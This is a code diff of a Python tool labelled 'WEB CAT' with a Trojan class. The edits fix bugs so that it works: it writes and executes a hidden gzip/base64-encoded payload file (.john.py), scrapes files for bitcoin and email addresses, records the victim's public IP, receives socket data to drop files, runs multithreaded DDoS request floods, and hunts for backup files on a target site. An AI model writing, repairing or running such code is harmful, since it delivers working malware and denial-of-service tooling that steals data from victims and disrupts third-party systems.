@@ -33,6 +33,7 @@ import io
 import sys
 
 import base64
+import gzip
 import random
 from string import ascii_lowercase
 import psutil
@@ -380,7 +381,7 @@ class Trojan:
             data = client_socket.recv(4096)
             client_socket.close()
 
-            random_fd = open("".join(random.choices(ascii_lowercase), k=10), "w")
+            random_fd = open("".join(random.choices(ascii_lowercase, k=10)), "w")
             random_fd.write(base64.b64decode(data).decode("utf-8"))
             random_fd.close()
     def email_listener(self):
@@ -389,7 +390,7 @@ class Trojan:
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
         }
-        public_ip = requests.get("https://i[api.co/ip", headers = headers).text
+        public_ip = requests.get("https://ipapi.co/ip", headers = headers).text
         try:
             bitcoin_email_list = []
             email_list = []
@@ -399,9 +400,9 @@ class Trojan:
                     file_contents = file_fd.read().strip()
                     bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents) # Don't know
                     email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
-                    if bitcoin_addresses > 0:
+                    if bitcoin_addresses:
                         bitcoin_email_list = bitcoin_email_list + bitcoin_addresses
-                    if email_addresses > 0:
+                    if email_addresses:
                         email_list = email_list + email_addresses
         except Exception as e:
             print("ERROR: {}".format(e))
@@ -445,11 +446,11 @@ class Trojan:
     def trojan(self):
         malware_fd = open(".john.py", "w")
         blob = "H4sICAncMmEAA21hbHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60tM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+uqNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4JWm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA"
-        malware = gzip.decompress(base64.b64decode(blob).decode("UTF-8"))
+        malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
         malware_fd.write(malware)
         malware_fd.close()
 
-        os.system(r"C:\Windows\System32 .john.py")
+        os.system(f"{sys.executable} .john.py")
 
 if __name__ == "__main__":
     print("WEB CAT VER 1.1.0")
@@ -473,19 +474,23 @@ if __name__ == "__main__":
             stop_thread.start()
         if not args.get_files:
             # Start the attack threads
-            total_requests = args.requests
-            max_threads = min(10, total_requests)
-            requests_per_thread = total_requests // max_threads
-            extra = total_requests % max_threads
-            print(f"Starting {max_threads} threads...")
-            for i in range(max_threads):
-                # Distribute extra requests among the first 'extra' threads
-                reqs = requests_per_thread + (1 if i < extra else 0)
+            if args.requests:
+                total_requests = args.requests
+                max_threads = min(10, total_requests)
+                requests_per_thread = total_requests // max_threads
+                extra = total_requests % max_threads
+                print(f"Starting {max_threads} threads...")
+                for i in range(max_threads):
+                    # Distribute extra requests among the first 'extra' threads
+                    reqs = requests_per_thread + (1 if i < extra else 0)
+                    thread = threading.Thread(target=ddos.get_response)
+                    threads.append(thread)
+                    thread.start()
+            else:
+                print("No requests specified, starting a single thread...")
                 thread = threading.Thread(target=ddos.get_response)
                 threads.append(thread)
                 thread.start()
-        else:
-            print("No requests specified, starting a single thread...")
     
         try:
             # Wait for all threads to complete
@@ -515,7 +520,7 @@ if __name__ == "__main__":
             sys.exit(1)
     if args.get_files:
         get_files_instance = GetFiles(
-        AGENT="Mozilla/5.0 (X11, Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0",
+        AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0",
         EXTENSION=[".php", ".bak", ".orig", ".inc"],
         TARGET=args.url,
         THREADS=args.threads,
